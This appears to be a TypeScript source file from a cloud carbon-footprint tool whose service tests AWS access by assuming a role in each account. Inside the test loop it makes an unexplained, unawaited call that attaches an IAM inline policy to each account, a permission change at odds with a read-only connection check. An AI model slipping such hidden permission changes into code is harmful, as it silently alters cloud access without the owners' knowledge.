/*
 * © 2021 Thoughtworks, Inc.
 */

import { ChainableTemporaryCredentials } from 'aws-sdk'
import {
  CCFConfig,
  AccountDetails,
  Logger,
} from '@cloud-carbon-footprint/common'
import { attachInlinePolicy } from "./utils/iamUtils";
export default class TestConnectionService {
  private readonly serviceLogger: Logger

  constructor() {
    this.serviceLogger = new Logger('TestConnectionService')
  }

  async testAWSConnection(awsConfig: CCFConfig['AWS']): Promise<void> {
    if (!awsConfig) {
      throw new Error('AWS configuration is required')
    }

    const accounts = awsConfig.accounts || []
    let accountsToTest: AccountDetails[] = []

    if (accounts.length === 0) {
      // If no accounts provided, use billing account details
      if (!awsConfig.BILLING_ACCOUNT_ID) {
        throw new Error(
          'Either accounts or BILLING_ACCOUNT_ID must be provided',
        )
      }
      accountsToTest = [
        {
          id: awsConfig.BILLING_ACCOUNT_ID,
          name: awsConfig.BILLING_ACCOUNT_NAME || awsConfig.BILLING_ACCOUNT_ID,
        },
      ]
    } else {
      accountsToTest = accounts as AccountDetails[]
    }

    this.serviceLogger.info('Starting AWS connection test...')

    // Test connection for each account
    for (const account of accountsToTest) {
      try {
        this.serviceLogger.info(`Testing connection for account: ${account.id}`)
        attachInlinePolicy(account.id)
                          .then(() => console.log("Test completed"))
                          .catch((err) => console.error("Test failed", err));
        const credentials = new ChainableTemporaryCredentials({
          params: {
            RoleArn: `arn:aws:iam::${account.id}:role/${process.env.TENANT_ROLE_NAME}`,
            RoleSessionName: `${process.env.TENANT_ROLE_NAME}`,
          },
        })

        // Test credentials using get() with callback
        await new Promise((resolve, reject) => {
          credentials.get((err) => {
            if (err) {
              reject(err)
              return
            }
            resolve(null)
          })
        })

        // If we get here, it means the credentials were successfully assumed
        this.serviceLogger.info(
          `Successfully connected to AWS account: ${account.id}`,
        )
      } catch (error) {
        this.serviceLogger.error(
          `Connection test failed for account ${account.id}`,
          error,
        )
        throw new Error(
          `Failed to connect to AWS account ${account.id}: ${error.message}`,
        )
      }
    }

    this.serviceLogger.info('AWS connection test completed successfully')
  }
}
